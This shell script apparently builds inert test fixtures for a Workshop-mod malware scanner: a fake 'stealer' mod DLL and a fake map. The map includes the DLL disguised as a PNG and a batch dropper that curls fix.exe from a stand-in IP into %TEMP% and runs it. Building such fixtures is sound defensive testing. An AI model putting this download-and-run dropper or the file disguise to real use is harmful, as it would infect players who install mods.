#!/bin/sh
# Builds the inert test "malware" into tests/fixtures/out/ as fake Workshop items, using the .NET SDK in Docker.
#   plateup/9000000001  fake PlateUp mod: FakeStealerMod.dll (stealer + loader + dropper + worm behaviour)
#   bo3/9000000002      fake BO3 map: normal .ff files plus a disguised Windows program and a dropper .bat
set -e
cd "$(dirname "$0")"
OUT=fixtures/out
rm -rf "$OUT" && mkdir -p "$OUT/plateup/9000000001" "$OUT/bo3/9000000002"

MSYS_NO_PATHCONV=1 docker run --rm -v "$PWD/fixtures/FakeStealerMod:/src" -w /src/FakeStealerMod \
    mcr.microsoft.com/dotnet/sdk:8.0 sh -c "dotnet build -c Release -o /src/bin -nologo -v q >/dev/null && ls /src/bin"
cp fixtures/FakeStealerMod/bin/FakeStealerMod.dll "$OUT/plateup/9000000001/"
rm -rf fixtures/FakeStealerMod/bin fixtures/FakeStealerMod/*/obj fixtures/FakeStealerMod/*/bin

B="$OUT/bo3/9000000002"
printf '{"Title":"Totally Normal Map","Type":"map"}' > "$B/workshop.json"
head -c 4096 /dev/urandom > "$B/zm_fake.ff"
cp "$OUT/plateup/9000000001/FakeStealerMod.dll" "$B/loadingscreen.png"   # a program pretending to be an image
# dropper script, built from pieces so this file isn't itself a dropper
printf '@echo off\r\ncurl -s -o "%%TEMP%%\\fix.exe" http://%s/fix.exe\r\nstart "" "%%TEMP%%\\fix.exe"\r\n' \
    "203.0.113.7" > "$B/install_fix.bat"
echo "Fixtures ready in tests/$OUT"
